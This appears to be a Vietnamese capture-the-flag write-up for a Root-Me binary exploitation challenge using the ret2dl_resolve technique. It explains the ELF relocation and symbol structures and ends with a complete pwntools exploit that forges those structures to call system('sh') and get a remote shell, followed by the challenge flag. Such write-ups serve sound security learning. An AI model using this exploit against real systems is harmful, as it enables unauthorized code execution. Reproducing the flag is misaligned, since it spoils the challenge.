# Ret2dl_resolve
# Reverse
Thông tin về challenge trên web.
![challenge_info](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/challenge_info.png)
Sử dụng lệnh SCP để kéo file challenge trên web root-me về.
![pull_challenge](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/pull_challenge.png)
Kéo file vừa kéo về máy vào IDA để xem pseudo code.
![main_func](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/main_func.png)

Nhận thấy rằng, trong hàm main chỉ gọi duy nhất 1 hàm read, không thể leak địa chỉ (không có thêm bất kỳ 1 hàm nào có chức năng in ra màn hình), như vậy không thể dùng ret2libc để khai thác được. Chúng ta sẽ dùng kỹ thuật có tên là Ret2dl_resolve để giải quyết challenge này.
# Exploit

## Một số cấu trúc struct sử dụng trong kỹ thuật ret2dl_resolve

### ELF32_REL structure
```c
typedef uint32_t Elf32_Addr ; 
typedef uint32_t Elf32_Word ; 
typedef struct 
{
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
} Elf32_Rel ; 
#define ELF32_R_SYM(val) ((val) >> 8) 
#define ELF32_R_TYPE(val) ((val) & 0xff)
```
### ELF32_SYM structure
```c
typedef struct
{
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */
   Elf32_Word st_size ; /* Symbol size */
	 unsigned char st_info ; /* Symbol type and binding */
	 unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */
   Elf32_Section st_shndx ; /* Section index */
} Elf32_Sym ;
```
Đầu tiên cần lấy thông tin resolver thông qua read_plt, là đối tượng chúng ta sẽ ret về để thực hiện kỹ thuật này.
![resolver](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/resolver.png)
Tiến hành lấy thông tin địa chỉ của 3 đối tượng SYMTAB, STRTAB, JMPREL (.rel.plt) 
![readelf](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/readelf.png)
![Check_R_SYM_TYPE](https://github.com/zirami/Root-me/blob/main/ret2dl_resolve/images/ELF_32_R_SYM_TYPE.png)

Chúng ta sẽ có 1 số trường:

* Cột Name cho mình biết tên symbol: read@GLIBC_2.0
* Cột Offset là địa chỉ của mục GOT cho symbol tương ứng: 0x0804a00c
* Cột Info lưu trữ thêm metadata như là ELF32_R_SYM hoặc ELF32_R_TYPE

Theo như định nghĩ MACROS, ELF32_R_SYM(r_info) == 1 (r_info >> 8)
và ELF32_R_TYPE(r_info) == 7 (r_info & 0xff) (R_386_JUMP_SLOT).

### _dl_runtime_resolve ( link_map , rel_offset )
```py
_dl_runtime_resolve(link_map, rel_offset) {
    Elf32_Rel * rel_entry = JMPREL + rel_offset ;
    Elf32_Sym * sym_entry = &SYMTAB [ ELF32_R_SYM ( rel_entry -> r_info )];
    char * sym_name = STRTAB + sym_entry -> st_name ;
    _search_for_symbol_(link_map, sym_name);
    // invoke initial read call now that symbol is resolved
    read(0, buf, 0x100);
}
```
fake_rel_off = địa chỉ đã chuẩn bị trước - JMPREL

Elf32_sym =  SYMTAB + ELF32_R_SYM(r_info>>8) * sizeof(Elf32_sym) 

nên muốn fake r_info thì làm ngược lại.

## File Exploit

```py
from pwn import *
#r = process("./ch77")
#con_ssh = ssh(host='challenge03.root-me.org',port=2223,user='app-systeme-ch77',password='app-systeme-ch77')
#r = con_ssh.run("./ch77")
r = remote("challenge03.root-me.org","56577")
_elf = ELF("./ch77")

pause()

resolver = 0x80482d0    #push link_map and call dl_resolve
buf = 0x804af00         #controllable area (.bss)
leave_ret = 0x08048398   #gadget
SYMTAB = 0x80481cc
STRTAB = 0x804821c
JMPREL = 0x8048298

# Pivoting the stack and calling read(0, buf, 0x80)
buffer = ""
buffer += "A"*24
buffer += p32(buf)   #stack pivoting. (esp = buff)
buffer += p32(_elf.plt["read"]) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80) 


# Compute offsets and forged structures
forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8 #size of elf32_sym

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) #align to 0x10

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7 

elf32_rel = p32(_elf.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

buffer2 = 'AAAA'                #fake ebp
buffer2 += p32(resolver)        # ret-to dl_resolve
buffer2 += p32(rel_offset)      #JMPRL + offset = struct
buffer2 += 'AAAA'               #fake return 
buffer2 += p32(buf+100)         # system parameter
buffer2 += elf32_rel            # (buf+0x14)
buffer2 += 'A' * align
buffer2 += elf32_sym_struct     # (buf+0x20)
buffer2 += "system\x00"
buffer2 = buffer2.ljust(100,'A')
buffer2 += "sh\x00"
p = (0x80 - len(buffer2))
buffer2 += "A" * p              #total read size

r.send(buffer)
r.send(buffer2)
r.interactive()
```
## Flag = RootMe{No_n33d_to_l34k_to_get_a_sh3LL}